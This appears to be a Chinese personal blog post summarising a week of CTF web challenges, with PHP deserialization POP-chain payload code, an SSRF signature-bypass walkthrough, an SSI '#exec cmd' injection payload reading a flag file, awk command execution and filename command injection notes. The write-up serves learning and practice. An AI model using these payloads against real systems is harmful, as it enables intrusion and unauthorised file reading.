@@ -1,0 +1,487 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>一周CTF刷题总结 | skkyblu3&#39;s Blog</title>
+<link rel="shortcut icon" href="https://skyblu3519.github.io/favicon.ico?v=1688904911482">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://skyblu3519.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="一周CTF刷题总结 | skkyblu3&#39;s Blog - Atom Feed" href="https://skyblu3519.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="记下学到东西的题目。
+BuuCTF
+[MRCTF2020]Ezpop
+字符串比较会出发__toString方法：preg_match(&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;, ..." />
+    <meta name="keywords" content="CTF" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://skyblu3519.github.io">
+  <img class="avatar" src="https://skyblu3519.github.io/images/avatar.png?v=1688904911482" alt="">
+  </a>
+  <h1 class="site-title">
+    skkyblu3&#39;s Blog
+  </h1>
+  <p class="site-description">
+    sky, blue and ...
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+      
+        <a href="https://skyblu3519.github.io/post/you-lian" class="menu">
+          友链
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              一周CTF刷题总结
+            </h2>
+            <div class="post-info">
+              <span>
+                2023-06-09
+              </span>
+              <span>
+                8 min read
+              </span>
+              
+                <a href="https://skyblu3519.github.io/tag/b7GKYdjmj/" class="post-tag">
+                  # CTF
+                </a>
+              
+            </div>
+            
+              <img class="post-feature-image" src="https://skyblu3519.github.io/post-images/yi-zhou-ctf-shua-ti-zong-jie.jpeg" alt="">
+            
+            <div class="post-content-wrapper">
+              <div class="post-content" v-pre>
+                <p>记下学到东西的题目。</p>
+<h1 id="buuctf">BuuCTF</h1>
+<h2 id="mrctf2020ezpop">[MRCTF2020]Ezpop</h2>
+<p>字符串比较会出发<code>__toString</code>方法：<code>preg_match(&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;, $this-&gt;source</code></p>
+<p>知道这个后pop链就容易构造了：</p>
+<pre><code class="language-php">&lt;?php
+#
+class Modifier {
+    protected  $var = 'php://filter/read=convert.base64-encode/resource=flag.php';
+
+}
+
+class Show{
+    public $source;
+    public $str;
+}
+
+class Test{
+    public $p;
+
+    public function __construct(){
+        $this-&gt;p = new Modifier();
+    }
+}
+
+$show1 = new Show();
+$show2 = new Show();
+$show2-&gt;str = new Test();
+$show1-&gt;source = $show2;
+echo serialize($show1);
+</code></pre>
+<h2 id="npuctf2020readlezphp">[NPUCTF2020]ReadlezPHP</h2>
+<p>eval不是函数，所以不能像这样调用<code>$b($a)</code><br>
+<img src="https://skyblu3519.github.io/post-images/1686319756354.png" alt="" loading="lazy"></p>
+<p>pop链（flag在环境变量中，在phpinfo查看）：</p>
+<pre><code class="language-php">&lt;?php
+class HelloPhp
+{
+    public $a = &quot;phpinfo()&quot;;
+    public $b = &quot;assert&quot;;
+}
+
+$c = new HelloPhp();
+echo serialize($c);
+</code></pre>
+<h2 id="de1ctf-2019ssrf-me">[De1CTF 2019]SSRF Me</h2>
+<p>进去是没有换行的源码，老实说这个自己整理还挺麻烦的，也不知道有什么工具。不过，我有ChatGPT😁<br>
+<img src="https://skyblu3519.github.io/post-images/1686326903811.png" alt="" loading="lazy"></p>
+<p>整理之后ChatGPT还提醒这段代码是Python2的，这一点还挺关键的。<br>
+<img src="https://skyblu3519.github.io/post-images/1686327017105.png" alt="" loading="lazy"></p>
+<p>贴一下源码：</p>
+<pre><code class="language-python">#!/usr/bin/env python
+# encoding=utf-8
+
+from flask import Flask
+from flask import request
+import socket
+import hashlib
+import urllib
+import sys
+import os
+import json
+
+reload(sys)
+sys.setdefaultencoding('latin1')
+
+app = Flask(__name__)
+secert_key = os.urandom(16)
+
+
+class Task:
+    def __init__(self, action, param, sign, ip):
+        self.action = action
+        self.param = param
+        self.sign = sign
+        self.sandbox = md5(ip)
+
+        if not os.path.exists(self.sandbox):  # SandBox For Remote_Addr
+            os.mkdir(self.sandbox)
+
+    def Exec(self):
+        result = {}
+        result['code'] = 500
+
+        if self.checkSign():
+            if &quot;scan&quot; in self.action:
+                tmpfile = open(&quot;./%s/result.txt&quot; % self.sandbox, 'w')
+                resp = scan(self.param)
+
+                if resp == &quot;Connection Timeout&quot;:
+                    result['data'] = resp
+                else:
+                    print(resp)
+                    tmpfile.write(resp)
+                    tmpfile.close()
+                    result['code'] = 200
+
+            if &quot;read&quot; in self.action:
+                f = open(&quot;./%s/result.txt&quot; % self.sandbox, 'r')
+                result['code'] = 200
+                result['data'] = f.read()
+
+            if result['code'] == 500:
+                result['data'] = &quot;Action Error&quot;
+        else:
+            result['code'] = 500
+            result['msg'] = &quot;Sign Error&quot;
+
+        return result
+
+    def checkSign(self):
+        if getSign(self.action, self.param) == self.sign:
+            return True
+        else:
+            return False
+
+
+# generate Sign For Action Scan.
+@app.route(&quot;/geneSign&quot;, methods=['GET', 'POST'])
+def geneSign():
+    param = urllib.unquote(request.args.get(&quot;param&quot;, &quot;&quot;))
+    action = &quot;scan&quot;
+    return getSign(action, param)
+
+
+@app.route('/De1ta', methods=['GET', 'POST'])
+def challenge():
+    action = urllib.unquote(request.cookies.get(&quot;action&quot;))
+    param = urllib.unquote(request.args.get(&quot;param&quot;, &quot;&quot;))
+    sign = urllib.unquote(request.cookies.get(&quot;sign&quot;))
+    ip = request.remote_addr
+
+    if waf(param):
+        return &quot;No Hacker!!!!&quot;
+
+    task = Task(action, param, sign, ip)
+    return json.dumps(task.Exec())
+
+
+@app.route('/')
+def index():
+    return open(&quot;code.txt&quot;, &quot;r&quot;).read()
+
+
+def scan(param):
+    socket.setdefaulttimeout(1)
+    try:
+        return urllib.urlopen(param).read()[:50]
+    except:
+        return &quot;Connection Timeout&quot;
+
+
+def getSign(action, param):
+    return hashlib.md5(secert_key + param + action).hexdigest()
+
+
+def md5(content):
+    return hashlib.md5(content).hexdigest()
+
+
+def waf(param):
+    check = param.strip().lower()
+
+    if check.startswith(&quot;gopher&quot;) or check.startswith(&quot;file&quot;):
+        return True
+    else:
+        return False
+
+
+if __name__ == '__main__':
+    app.debug = False
+    app.run(host='0.0.0.0', port=1234)
+</code></pre>
+<p>这段代码的逻辑比较简单。已知flag在是同目录下的<code>flag.txt</code>，读取flag的方式是通过<code>checkSign</code>中的<code>scan</code>将<code>flag.txt</code>的内容保存到<code>&quot;./%s/result.txt&quot; % self.sandbox</code>，再通过<code>read</code>读取其中的内容。</p>
+<p>解题的关键有两个：</p>
+<ul>
+<li><code>getSign</code>中计算签名的方式是字符串直接拼接</li>
+<li><code>checkSign</code>中执行action的判断用的是<code>in</code></li>
+</ul>
+<p>看看下面的解题流程就知道这两个点导致的漏洞。</p>
+<p>请求<code>/geneSign?param=flag.txtread</code>获得一个Sign<br>
+<img src="https://skyblu3519.github.io/post-images/1686328069673.png" alt="" loading="lazy"></p>
+<p>请求<code>/geneSign?param=flag.txt</code>，带上<code>Cookie</code>其中<code>action=readscan; sign=之前的sign</code><br>
+<img src="https://skyblu3519.github.io/post-images/1686328545619.png" alt="" loading="lazy"></p>
+<p>这里面学到的点：可以像<code>urllib.urlopen('flag.txt')</code>直接对本地的<code>flag.txt</code>读取，所以<code>waf()</code>过滤的<code>gopher</code>和<code>file</code>也就不起作用。不过这是Python2.x才有的，在Python 3 中<code>urllib.urlopen()</code> 被改为 <code>urllib.request.urlopen()</code></p>
+<h2 id="bjdctf2020easysearch">[BJDCTF2020]EasySearch</h2>
+<p>源码：<code>index.php.swp</code></p>
+<p>分析源码有两这里有两个考点：</p>
+<ul>
+<li>md5爆破，之后好好学习一下Python多线程，这里可用的<code>2020666</code></li>
+<li>SSI 命令执行，记一下执行的代码</li>
+</ul>
+<p>扩展名 .stm、.shtm 和 .shtml都用于表示服务器端包含 (SSI) HTML 文件。执行代码的方式：</p>
+<pre><code class="language-html">&lt;!--#exec cmd=&quot;your-command-here&quot; --&gt;
+</code></pre>
+<p>payload：<code>password=2020666&amp;username=&lt;!--#exec cmd=&quot;cat ../flag_990c66bf85a09c664f0b6741840499b2&quot;--&gt;</code></p>
+<p>响应头中有文件的位置：<br>
+<img src="https://skyblu3519.github.io/post-images/1686329663807.png" alt="" loading="lazy"></p>
+<h1 id="ctfshow">ctfshow</h1>
+<p>主要做了下菜狗杯的题目</p>
+<h2 id="化零为整">化零为整</h2>
+<p>一个变量长度只能是1，用url编码组合拼接<br>
+大牛 = <code>%E5%A4%A7%E7%89%9B</code><br>
+payload：<code>?1=%E5&amp;2=%A4&amp;3=%A7&amp;4=%E7&amp;5=%89&amp;6=%9B</code></p>
+<h2 id="传说之下">传说之下</h2>
+<p>开始游戏暂停调试，在scope的local下的this中，修改score为2077<br>
+<img src="https://skyblu3519.github.io/post-images/1686329900570.png" alt="" loading="lazy"><br>
+console中get flag<br>
+<img src="https://skyblu3519.github.io/post-images/1686329906306.png" alt="" loading="lazy"></p>
+<h2 id="easypython_p">easyPytHon_P</h2>
+<p>awk可以用来执行命令：<code>awk '{system(&quot;ls&quot;)}' 1.py</code></p>
+<h2 id="茶歇区">茶歇区</h2>
+<p>PHP整形溢出</p>
+<p>999999999999999999杯咖啡</p>
+<h2 id="小舔田">小舔田？</h2>
+<p>很简单的pop构造：</p>
+<pre><code class="language-php">&lt;?php
+class Moon{
+    public $name;
+    public function __construct(){
+        $this-&gt;name = new Ion_Fan_Princess();
+    }
+
+}
+
+class Ion_Fan_Princess{
+    public $nickname=&quot;小甜甜&quot;;
+
+}
+
+$m = new Moon();
+echo serialize($m);
+</code></pre>
+<p>但却出现了错误：<br>
+<img src="https://skyblu3519.github.io/post-images/1686330012766.png" alt="" loading="lazy"></p>
+<p>与网上的payload进行对比：</p>
+<pre><code class="language-php">O:4:&quot;Moon&quot;:1:{s:4:&quot;name&quot;;O:16:&quot;Ion_Fan_Princess&quot;:1:{s:8:&quot;nickname&quot;;s:6:&quot;小甜甜&quot;;}}	// 我输出的
+O:4:&quot;Moon&quot;:1:{s:4:&quot;name&quot;;O:16:&quot;Ion_Fan_Princess&quot;:1:{s:8:&quot;nickname&quot;;s:9:&quot;小甜甜&quot;;}}	// 正确的
+</code></pre>
+<p>区别点在于nickname的长度一个是6一个是9，为什么会出现这种情况呢🤔明天记着问问！</p>
+<h2 id="lsb探姬">LSB探姬</h2>
+<p>这里直接拼接的文件名可以命令执行<br>
+<img src="https://skyblu3519.github.io/post-images/1686330132262.png" alt="" loading="lazy"></p>
+<p>让ChatGPT帮忙复习一下命令的连接符。</p>
+<p>在 Linux 中，这五个符号（<code>;</code>, <code>|</code>, <code>||</code>, <code>&amp;</code>, <code>&amp;&amp;</code>）用于在命令行中连接多个命令，并对命令的执行流程进行控制。他们的含义和使用方式如下：</p>
+<ol>
+<li>
+<p><strong><code>;</code>（分号）：</strong> 使用分号可以在一行中执行多个命令，这些命令会按顺序一个接一个地执行，不考虑前一个命令的成功或失败。例如：</p>
+<pre><code class="language-bash">command1 ; command2
+</code></pre>
+<p>在这个例子中，<code>command1</code> 会先执行，无论成功与否，接下来都会执行 <code>command2</code>。</p>
+</li>
+<li>
+<p><strong><code>|</code>（管道）：</strong> 管道符将前一个命令的输出作为后一个命令的输入。例如：</p>
+<pre><code class="language-bash">command1 | command2
+</code></pre>
+<p>在这个例子中，<code>command1</code> 的输出会作为 <code>command2</code> 的输入。</p>
+</li>
+<li>
+<p><strong><code>||</code>（或）：</strong> <code>||</code> 是一个逻辑操作符，仅在前一个命令执行失败（返回非零值）时，才会执行后一个命令。例如：</p>
+<pre><code class="language-bash">command1 || command2
+</code></pre>
+<p>在这个例子中，只有当 <code>command1</code> 失败时，才会执行 <code>command2</code>.</p>
+</li>
+<li>
+<p><strong><code>&amp;</code>（后台执行）：</strong> 使用 <code>&amp;</code> 符号，可以使命令在后台运行。例如：</p>
+<pre><code class="language-bash">command1 &amp; command2
+</code></pre>
+<p>在这个例子中，<code>command1</code> 会在后台运行，同时会立即执行 <code>command2</code>，而不等待 <code>command1</code> 完成。</p>
+</li>
+<li>
+<p><strong><code>&amp;&amp;</code>（与）：</strong> <code>&amp;&amp;</code> 是一个逻辑操作符，仅在前一个命令执行成功（返回零值）时，才会执行后一个命令。例如：</p>
+<pre><code class="language-bash">command1 &amp;&amp; command2
+</code></pre>
+<p>在这个例子中，只有当 <code>command1</code> 执行成功时，才会执行 <code>command2</code>.</p>
+</li>
+</ol>
+<p>这些都是 Shell 编程中常见的操作符，用于控制命令的执行流程。</p>
+<p><strong>NICE GPT!!!</strong></p>
+<h2 id="web签到">web签到</h2>
+<figure data-type="image" tabindex="1"><img src="https://skyblu3519.github.io/post-images/1686330247006.png" alt="" loading="lazy"></figure>
+<h1 id="总结">总结</h1>
+<p>这周做了14道buuctf、16道ctfshow和两道复现的题。接下来先好好学习下python多线程，写点脚本练下手，感觉确实蛮重要的。<br>
+<img src="https://skyblu3519.github.io/post-images/1686330511263.png" alt="" loading="lazy"><br>
+<img src="https://skyblu3519.github.io/post-images/1686330535737.png" alt="" loading="lazy"></p>
+<p>下周准备网安实验结课，后面项目也要开发了。争取还是多抽点时间刷刷题吧！</p>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li><a href="#buuctf">BuuCTF</a>
+<ul>
+<li><a href="#mrctf2020ezpop">[MRCTF2020]Ezpop</a></li>
+<li><a href="#npuctf2020readlezphp">[NPUCTF2020]ReadlezPHP</a></li>
+<li><a href="#de1ctf-2019ssrf-me">[De1CTF 2019]SSRF Me</a></li>
+<li><a href="#bjdctf2020easysearch">[BJDCTF2020]EasySearch</a></li>
+</ul>
+</li>
+<li><a href="#ctfshow">ctfshow</a>
+<ul>
+<li><a href="#%E5%8C%96%E9%9B%B6%E4%B8%BA%E6%95%B4">化零为整</a></li>
+<li><a href="#%E4%BC%A0%E8%AF%B4%E4%B9%8B%E4%B8%8B">传说之下</a></li>
+<li><a href="#easypython_p">easyPytHon_P</a></li>
+<li><a href="#%E8%8C%B6%E6%AD%87%E5%8C%BA">茶歇区</a></li>
+<li><a href="#%E5%B0%8F%E8%88%94%E7%94%B0">小舔田？</a></li>
+<li><a href="#lsb%E6%8E%A2%E5%A7%AC">LSB探姬</a></li>
+<li><a href="#web%E7%AD%BE%E5%88%B0">web签到</a></li>
+</ul>
+</li>
+<li><a href="#%E6%80%BB%E7%BB%93">总结</a></li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://skyblu3519.github.io/post/ciscn2019justsoso/">
+              <h3 class="post-title">
+                [CISCN2019]JustSoso
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
+  <a class="rss" href="https://skyblu3519.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
